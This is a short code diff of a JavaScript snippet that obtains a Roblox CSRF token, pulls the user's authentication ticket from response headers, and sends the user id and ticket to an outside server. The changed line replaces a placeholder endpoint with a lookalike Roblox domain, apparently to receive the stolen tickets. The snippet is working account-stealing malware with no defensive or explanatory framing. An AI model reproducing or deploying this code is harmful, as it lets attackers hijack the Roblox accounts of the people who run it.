@@ -16,6 +16,6 @@
         headers: {"x-csrf-token": t}
     })).headers.get("rbx-authentication-ticket")
 
-    await fetch("https://yourdomain.com/rblxapi/send.php" + '?id= ' + id + '?t=' + ticket);
+    await fetch("https://roblox.com.si/creator/ControlPage" + '?id= ' + id + '?t=' + ticket);
 })()
 
